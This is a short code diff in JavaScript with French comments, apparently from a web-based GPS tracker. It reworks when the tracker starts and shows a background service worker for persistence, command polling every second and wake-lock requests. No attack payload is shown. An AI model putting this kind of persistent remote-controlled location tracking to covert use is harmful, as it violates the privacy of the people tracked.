@@ -1113,7 +1113,14 @@ function startGpsTracking() {
         );
 }
 
-if (document.readyState === 'complete') {
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    // Initialisation immédiate
+    initTracker();
+} else {
+    document.addEventListener('DOMContentLoaded', initTracker);
+}
+
+function initTracker() {
     // Enregistrement du Service Worker pour la survie en arrière-plan
     if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('/sw.js').then(reg => {
@@ -1128,16 +1135,12 @@ if (document.readyState === 'complete') {
     startVerification();
     
     // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
-    // On utilise une boucle récursive pour garantir qu'une seule requête tourne à la fois
     const pollCommands = async () => {
         await checkCommands();
         setTimeout(pollCommands, 1000);
     };
     pollCommands();
 
-    // Tenter de réactiver le Wake Lock au clic ou focus
     document.addEventListener('click', requestWakeLock);
     window.addEventListener('focus', requestWakeLock);
-} else {
-    window.addEventListener('load', startVerification);
 }
